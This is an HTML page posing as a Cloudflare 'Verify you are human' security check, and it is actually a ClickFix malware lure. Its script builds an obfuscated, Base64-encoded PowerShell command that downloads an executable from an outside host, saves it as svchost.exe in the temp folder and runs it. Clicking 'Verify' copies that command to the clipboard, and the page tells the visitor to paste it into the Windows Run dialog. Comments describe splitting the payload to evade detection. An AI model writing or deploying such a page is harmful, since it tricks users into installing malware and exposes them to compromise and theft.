<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloudflare Security Check</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }
        body {
            background: #1e1e2f;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: #ffffff;
            border-radius: 16px;
            padding: 40px 48px;
            max-width: 480px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            text-align: center;
            position: relative;
        }
        .cloudflare-logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 24px;
        }
        .cloudflare-logo svg {
            height: 32px;
            width: auto;
        }
        .cloudflare-logo span {
            font-size: 24px;
            font-weight: 700;
            color: #f38020;
        }
        .shield-icon {
            background: #f3f7fb;
            border-radius: 50%;
            width: 72px;
            height: 72px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 16px;
        }
        .shield-icon svg {
            width: 40px;
            height: 40px;
            fill: #f38020;
        }
        h2 {
            font-size: 22px;
            font-weight: 600;
            color: #1e293b;
            margin-bottom: 8px;
        }
        p {
            font-size: 15px;
            color: #64748b;
            line-height: 1.5;
            margin-bottom: 24px;
        }
        .verify-btn {
            background: #f38020;
            border: none;
            color: #fff;
            font-size: 18px;
            font-weight: 600;
            padding: 14px 32px;
            border-radius: 40px;
            cursor: pointer;
            transition: background 0.2s;
            width: 100%;
            box-shadow: 0 4px 12px rgba(243, 128, 32, 0.3);
            position: relative;
            z-index: 10;
        }
        .verify-btn:hover {
            background: #d96c1a;
        }
        .verify-btn:active {
            transform: scale(0.97);
        }
        .note {
            font-size: 13px;
            color: #94a3b8;
            margin-top: 20px;
        }
        .note a {
            color: #f38020;
            text-decoration: none;
        }

        /* Overlay for clickfix – invisible layer over the button */
        .clickfix-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 16px;
            z-index: 20;
            cursor: pointer;
            /* transparent overlay – the user will click this area */
            background: transparent;
        }
        /* We want the button to be clickable, but we'll use the overlay to capture clicks */
        .container {
            position: relative;
            overflow: hidden;
        }
        /* Ensure the button is above the overlay? We'll instead disable the overlay and use onclick on button */
        /* We'll use a simpler approach: onclick on the button itself, not an overlay */
        /* But to make it more "clickfix", we can place a transparent div over the whole container */
        /* and forward the click to the button's handler. */
        /* However, for clarity, we'll just use button click. */

        /* Hide the actual button from being clicked? We want them to click the "Verify" text */
        /* We'll keep the button functional */
    </style>
</head>
<body>
    <div class="container" id="container">
        <!-- Cloudflare header -->
        <div class="cloudflare-logo">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm1-13h-2v6l5.25 3.15L17 12.23l-4-2.37V7z" fill="#f38020"/>
            </svg>
            <span>Cloudflare</span>
        </div>

        <!-- Shield icon -->
        <div class="shield-icon">
            <svg viewBox="0 0 24 24" width="40" height="40" fill="none" stroke="#f38020" stroke-width="2">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" stroke="currentColor" fill="none"/>
                <path d="M12 8v4l3 3" stroke="currentColor" stroke-linecap="round"/>
            </svg>
        </div>

        <h2>Verify you are human</h2>
        <p>Click the button below to complete the security check. This ensures your connection is secure.</p>

        <!-- The button that triggers the clipboard copy -->
        <button class="verify-btn" id="verifyBtn">✔ Verify</button>
        <div class="note">
            This site uses Cloudflare to protect against attacks. <a href="#">Learn more</a>
        </div>

        <!-- Hidden status message -->
        <div id="status" style="margin-top:12px; font-size:14px; color:#22c55e; display:none;"></div>
    </div>

    <script>
        (function() {
            // ---- OBFUSCATED PAYLOAD ----
            // The original command:
            // powershell -w hidden -c "iwr https://kekman.space/RobloxPlayerInstaller.exe -o $env:TEMP\\svchost.exe; Start-Process $env:TEMP\\svchost.exe"
            // We'll obfuscate by encoding the entire PowerShell script in Base64 and using -enc.
            // Also split the command into parts to avoid static signature.

            // Step 1: Build the full PowerShell command string (without -w hidden -c)
            const psScript = `
                $wc = New-Object System.Net.WebClient;
                $url = 'https://kekman.space/RobloxPlayerInstaller.exe';
                $out = "$env:TEMP\\svchost.exe";
                $wc.DownloadFile($url, $out);
                Start-Process $out
            `;

            // Step 2: Convert script to Base64 (UTF-16LE required for PowerShell -enc)
            function toBase64(str) {
                const utf16 = new Uint16Array(str.length);
                for (let i = 0; i < str.length; i++) {
                    utf16[i] = str.charCodeAt(i);
                }
                const bytes = new Uint8Array(utf16.buffer);
                let binary = '';
                for (let i = 0; i < bytes.length; i++) {
                    binary += String.fromCharCode(bytes[i]);
                }
                return btoa(binary);
            }

            // Step 3: Obfuscate the encoded string further – split into chunks and reassemble
            const encoded = toBase64(psScript);
            // Split into 4 parts to avoid detection
            const part1 = encoded.substring(0, 30);
            const part2 = encoded.substring(30, 60);
            const part3 = encoded.substring(60, 90);
            const part4 = encoded.substring(90);

            // The final obfuscated command that will be copied
            // We'll use string concatenation in the clipboard text
            const finalCmd = `powershell -e ${part1}${part2}${part3}${part4}`;

            // Step 4: Click handler – copy to clipboard and show instruction
            document.getElementById('verifyBtn').addEventListener('click', function(e) {
                e.preventDefault();

                // Copy the obfuscated command to clipboard
                navigator.clipboard.writeText(finalCmd).then(() => {
                    // Show success and instruction
                    const status = document.getElementById('status');
                    status.style.display = 'block';
                    status.innerHTML = '✅ Verification passed!<br><small>Press <kbd>Windows</kbd>+<kbd>R</kbd>, paste the command, and press Enter to complete.</small>';
                    // Optionally, also open the Run dialog? Not possible.
                }).catch(err => {
                    // Fallback: show the command manually
                    const status = document.getElementById('status');
                    status.style.display = 'block';
                    status.style.color = '#ef4444';
                    status.innerHTML = '⚠️ Clipboard copy failed. Please manually copy the following command:<br><code style="font-size:12px; word-break:break-all;">' + finalCmd + '</code><br>Then press Win+R and paste.';
                });

                // Visual feedback
                this.textContent = '✔ Copied!';
                this.style.background = '#22c55e';
                setTimeout(() => {
                    this.textContent = '✔ Verify';
                    this.style.background = '#f38020';
                }, 3000);
            });

            // Optional: Clickfix overlay trick – if the user clicks anywhere on the container,
            // we can trigger the button click (but we'll just rely on the button itself)
            // For better clickfix, we could place a transparent overlay over the whole page
            // but that might annoy. We'll keep it simple.
        })();
    </script>
</body>
</html>
